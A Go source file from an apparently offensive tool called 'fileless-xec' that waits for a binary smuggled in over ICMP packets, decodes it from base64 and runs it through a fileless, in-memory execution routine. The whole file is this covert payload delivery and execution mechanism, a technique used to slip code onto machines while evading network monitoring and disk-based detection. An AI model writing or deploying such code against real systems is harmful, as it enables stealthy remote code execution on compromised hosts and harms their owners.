package server

import (
	b64 "encoding/base64"
	"fileless-xec/pkg/config"
	"fileless-xec/pkg/exec"
	"log"

	"github.com/ariary/QueenSono/pkg/icmp"
)

//Wait for ICMP packet containing binary content and execute it
func ICMPServerAndExecute(listening string, cfg *config.Config) {

	size, _ := icmp.GetMessageSizeAndSender(listening)
	binary, missed := icmp.Serve(listening, size, false)
	if len(missed) > 0 {
		log.Fatal("Does not received all icmp packets")
	}

	decodedB, _ := b64.RawStdEncoding.DecodeString(binary)
	// if err != nil {
	// 	fmt.Println(err)
	// 	os.Exit(1)
	// }
	// -> illegal base64 data at input byte 2842501

	cfg.BinaryContent = string(decodedB)
	exec.Filelessxec(cfg)

}
